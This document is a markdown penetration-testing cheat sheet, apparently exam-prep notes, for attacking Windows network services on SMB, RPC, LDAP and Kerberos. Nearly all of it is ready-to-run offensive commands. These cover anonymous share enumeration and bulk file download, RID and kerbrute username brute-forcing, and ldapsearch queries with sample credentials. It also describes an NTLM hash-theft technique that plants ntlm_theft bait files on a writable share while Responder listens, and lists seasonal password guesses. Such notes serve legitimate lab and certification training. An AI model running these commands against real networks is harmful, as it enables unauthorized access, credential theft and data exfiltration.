
**UDP --> SNMP (Port 161)**

### SMB (Port 445)

Scans:
```bash
nmblookup -A <IP>
nbtscan <IP>
enum4linux -a <IP>
enum4linux -a -u <user> -p <pass> <IP>
```

Determine version:
- [Script](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

RID bruteforce usernames:
```bash
impacket-lookupsid guest@<domain>
nxc smb <IP> -u '' -p '' --rid-brute
nxc smb <IP> -u '' -p '' --users
```

Nmap enumeration:
```bash
nmap --script smb* -p445 <IP>
nmap --script smb-vuln* -p445 <IP>
```

List shares:
```bash
smbclient --no-pass -L //<IP>
smbmap -H <IP> [-P <PORT>]
nxc smb <IP> -u '' -p '' --shares
```
>[!info]
>- With credentials: `smbclient -L \\\\<SERVER-IP> -U <USERNAME>%<PASSWORD>`
>- With hash: `smbclient -L \\\\<SERVER-IP> -U <USERNAME>%<HASH>`
>- **TRY DIFFERENT TOOLS!!!**
>- **recurse;ls**

Connect to shares:
```bash
smbclient --no-pass //<IP>/<Folder>

# Download everything
recurse on
prompt off
mget *
```

Try to connect using guest account:
```bash
nxc smb 192.168.210.159 -u "guest" -p "" --shares
```

Authenticate to share using impacket: (without password)
```bash
impacket-smbclient <domain>/<user>@<IP> -no-pass -dc-ip <IP>
```

**Writable SMB share? Leak NTLM hash using .URI file & Responder!**
```bash
# Responder
sudo responder -I tun0 -A # Analyze mode

# Generate malicious files
python3 ntlm_theft.py -g all -s <Kali-IP> -f test

# Upload files to SMB share
```
>[!info]
>- [GitHub PoC](https://github.com/Greenwolf/ntlm_theft)
>- [Writeup1](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)
>- [Writeup2](https://medium.com/@persecure/breach-vulnlab-f30761f08be6)


### RPC (Port 135)

Enumerate users:
```bash
rpcclient -N -U "" <IP>

enumdomusers
```
>[!info]
>**Try with & without credentials!**


### LDAP (Port 389)

Check for description fields with passwords or simply enumerate users
```bash
nmap -n -sV --script "ldap* and not brute" <IP>
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=hutch,DC=offsec"
ldapsearch -x -H ldap://<IP> -D 'GIIKER\dani.auguste' -w 'Password123!' -b "DC=giiker,DC=local"
```
>[!info] 
>**Try with & without credentials!**


### Kerberos (Port 88)

Use kerbrute to check for valid users
```bash
./kerbrute userenum -d <domain> usernames.txt --dc <IP>

# Wordlist:
./kerbrute userenum -d <domain> /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc <IP>
```
>[!info]
>Use valid usernames as passwords on `nxc smb`

Common passwords may have something to do with the seasons: (year can vary)
```bash
Spring2023
Summer2023
Autumn2023
Fall2023
Winter2023
```
